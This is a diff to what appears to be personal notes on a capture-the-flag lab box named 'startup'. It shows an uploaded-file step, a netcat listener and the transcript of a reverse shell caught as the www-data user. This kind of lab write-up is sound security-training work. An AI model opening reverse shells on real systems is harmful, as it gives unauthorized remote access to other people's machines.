@@ -451,4 +451,20 @@ ftp> ls
 ```
 
 > [!info]
-> I put in target ip instead of AM IP - haven't executed cmd yet cause of 
+> I put in target ip instead of AM IP - haven't executed cmd yet cause of this thinking lol anyway amended accordingly now so lets go:
+
+![](Obsidian%20assets/files%20-%20uploaded%20fiels.png)
+
+```
+root@ip-10-67-86-193:~# nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.67.132.67 58372
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 18:49:25 up  1:16,  0 users,  load average: 0.07, 0.04, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
